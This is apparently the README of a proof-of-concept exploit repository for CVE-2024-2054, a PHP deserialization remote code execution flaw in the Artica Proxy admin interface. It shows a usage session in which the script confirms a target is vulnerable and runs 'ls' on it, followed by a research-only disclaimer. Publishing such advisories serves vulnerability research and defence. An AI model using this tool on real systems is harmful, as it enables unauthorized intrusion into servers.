# CVE-2024-2054 Artica-Proxy administrative web application insecure deserialization (RCE)

An exploit proof of concept for ARTICA PROXY Administrative web application CVE-2024-2054

# Blog Post
More details here: https://blog.sonicwall.com/en-us/2024/03/unpatched-php-deserialization-vulnerability-in-artica-proxy/

# Usage

```
$ python3 CVE-2024-2054.py
Enter url: https://8X.XX.XX.X4:9000
Vulnerable
enter command: ls

assets
index.html
wiz.upload.php
wiz.wizard.php
wiz.wizard.progress.php

```
# Disclaimer

This POC has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project creator/maintainers are not responsible or liable for misuse of the software/POC. Use responsibly.
